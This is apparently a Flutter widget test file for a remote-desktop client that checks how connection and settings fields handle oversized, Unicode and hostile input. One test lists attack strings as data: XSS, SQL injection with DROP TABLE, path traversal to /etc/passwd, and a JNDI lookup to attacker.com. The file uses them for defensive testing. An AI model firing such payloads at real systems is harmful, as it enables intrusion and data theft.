import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:camellia_remote_app/common.dart';
import 'package:camellia_remote_app/common/formatter/id_formatter.dart';
import 'package:camellia_remote_app/common/widgets/server_settings_dialog.dart';
import 'package:camellia_remote_app/desktop/pages/connection_page.dart';
import '../harness/test_app_harness.dart';

void main() {
  setUp(() async {
    await TestAppHarness.setUp();
  });

  group('Tier 2: Input Extremes & Adversarial Text Boundaries', () {
    testWidgets(
      '1. Oversized 256-character peer ID input does not overflow layout or crash formatter',
      (tester) async {
        await TestAppHarness.pumpWidget(
          tester,
          surfaceSize: const Size(1280, 800),
          child: const Scaffold(
            body: Center(
              child: SizedBox(
                width: 600,
                child: ConnectionPage(showDevices: false),
              ),
            ),
          ),
        );
        await tester.pump();

        final textField = find.byType(TextField);
        expect(textField, findsOneWidget);

        // Generate a 256-character digit string: '1234567890...'
        final oversizedId = List.generate(256, (i) => '${(i % 10)}').join();
        await tester.enterText(textField, oversizedId);
        await tester.pump();

        final controller = tester.widget<TextField>(textField).controller;
        expect(controller, isNotNull);
        expect(controller!.text.isNotEmpty, isTrue);

        // trimID strips spaces and matches raw sequence
        final trimmed = trimID(controller.text);
        expect(trimmed, equals(oversizedId));

        // Layout does not overflow and no exception thrown
        expect(tester.takeException(), isNull);

        await TestAppHarness.tearDown(tester);
      },
    );

    testWidgets(
      '2. Unicode hostnames, Cyrillic, CJK, and emoji inputs preserve character fidelity',
      (tester) async {
        final serverConfig = ServerConfig(
          idServer: '测试-id-服务器.中国:21117',
          relayServer: 'сервер-реле.рф:21117',
          apiServer: 'https://💻-relay.camellia.org:443',
          key: 'token-🔑-安全密钥-123456',
        );

        await TestAppHarness.pumpWidget(
          tester,
          surfaceSize: const Size(1280, 800),
          child: Scaffold(
            body: Center(
              child: ElevatedButton(
                onPressed: () {
                  showServerSettingsWithValue(
                    serverConfig,
                    gFFI.dialogManager,
                    null,
                  );
                },
                child: const Text('Open Unicode Server Settings'),
              ),
            ),
          ),
        );
        await tester.pump();

        // Open dialog
        await tester.tap(find.text('Open Unicode Server Settings'));
        await tester.pump();
        await tester.pump(const Duration(milliseconds: 200));

        // Verify unicode text preservation in form fields
        expect(find.text('测试-id-服务器.中国:21117'), findsOneWidget);
        expect(find.text('сервер-реле.рф:21117'), findsOneWidget);
        expect(find.text('https://💻-relay.camellia.org:443'), findsOneWidget);
        expect(find.text('token-🔑-安全密钥-123456'), findsOneWidget);

        // Dismiss dialog
        await tester.tap(find.text('Cancel').first);
        await tester.pump();
        await tester.pump(const Duration(milliseconds: 200));

        await TestAppHarness.tearDown(tester);
      },
    );

    testWidgets(
      '3. Adversarial script injection, SQL syntax, and control characters treated as literals',
      (tester) async {
        await TestAppHarness.pumpWidget(
          tester,
          surfaceSize: const Size(1280, 800),
          child: const Scaffold(
            body: Center(
              child: SizedBox(
                width: 600,
                child: ConnectionPage(showDevices: false),
              ),
            ),
          ),
        );
        await tester.pump();

        final textField = find.byType(TextField);

        // Payloads including XSS, SQL, and escape sequences
        const payloads = [
          "<script>alert('xss')</script>",
          "' OR '1'='1'; DROP TABLE peers; --",
          "../../../../etc/passwd",
          "\${jndi:ldap://attacker.com/a}",
          "NULL\x00BYTE\r\nTEST",
        ];

        for (final payload in payloads) {
          await tester.enterText(textField, payload);
          await tester.pump();

          final text = tester.widget<TextField>(textField).controller?.text ?? '';
          expect(text, isNotNull);
          // System handles string safely without executing or throwing
          expect(tester.takeException(), isNull);
        }

        await TestAppHarness.tearDown(tester);
      },
    );

    testWidgets(
      '4. Rapid clear and typing alternation synchronizes controller without race condition',
      (tester) async {
        await TestAppHarness.pumpWidget(
          tester,
          surfaceSize: const Size(1280, 800),
          child: const Scaffold(
            body: Center(
              child: SizedBox(
                width: 600,
                child: ConnectionPage(showDevices: false),
              ),
            ),
          ),
        );
        await tester.pump();

        final textField = find.byType(TextField);

        // Rapid sequence without intermediate settling
        await tester.enterText(textField, '123');
        await tester.enterText(textField, '');
        await tester.enterText(textField, '456789');
        await tester.enterText(textField, '');
        await tester.enterText(textField, '999888777');
        await tester.pump();

        final controller = tester.widget<TextField>(textField).controller;
        expect(controller?.text, equals('999 888 777'));
        expect(trimID(controller!.text), equals('999888777'));

        await TestAppHarness.tearDown(tester);
      },
    );

    testWidgets(
      '5. ID normalization handles varied whitespace, tabs, and interspersed dashes cleanly',
      (tester) async {
        // Test trimID against spaces and format variations
        expect(trimID('  123 456 789  '), equals('123456789'));
        expect(trimID('123-456-789'), equals('123-456-789'));
        expect(trimID('   123    456    789   '), equals('123456789'));

        // Format ID
        final formatted = formatID('123456789');
        expect(formatted, equals('123 456 789'));

        // Shorter partial ID formats
        expect(formatID('12345'), equals('12 345'));
        expect(formatID('12'), equals('12'));
        expect(formatID(''), isEmpty);

        // Verification via ConnectionPage UI
        await TestAppHarness.pumpWidget(
          tester,
          surfaceSize: const Size(1280, 800),
          child: const Scaffold(
            body: Center(
              child: SizedBox(
                width: 600,
                child: ConnectionPage(showDevices: false),
              ),
            ),
          ),
        );
        await tester.pump();

        final textField = find.byType(TextField);
        await tester.enterText(textField, '12345678');
        await tester.pump();

        expect(
          tester.widget<TextField>(textField).controller?.text,
          equals('12 345 678'),
        );

        await TestAppHarness.tearDown(tester);
      },
    );

    testWidgets(
      '6. Password extremes (1-char to 128-char symbols) validate securely without overflow',
      (tester) async {
        // 1. Minimum 1-char password
        gFFI.serverModel.serverPasswd.text = 'x';
        expect(gFFI.serverModel.serverPasswd.text.length, equals(1));

        // 2. Extreme 128-char high-entropy symbol password
        const symbols = r'!@#$%^&*()_+-=[]{}|;:,.<>?';
        final complexPass = List.generate(
          128,
          (i) => symbols[i % symbols.length],
        ).join();
        gFFI.serverModel.serverPasswd.text = complexPass;

        await TestAppHarness.pumpWidget(
          tester,
          surfaceSize: const Size(1280, 800),
          child: Scaffold(
            body: Center(
              child: SizedBox(
                width: 400,
                child: TextFormField(
                  controller: gFFI.serverModel.serverPasswd,
                  obscureText: true,
                  decoration: const InputDecoration(labelText: 'Password'),
                ),
              ),
            ),
          ),
        );
        await tester.pump();

        final passField = find.byType(TextFormField);
        expect(passField, findsOneWidget);
        expect(
          tester.widget<TextFormField>(passField).controller?.text,
          equals(complexPass),
        );
        expect(tester.takeException(), isNull);

        await TestAppHarness.tearDown(tester);
      },
    );
  });
}
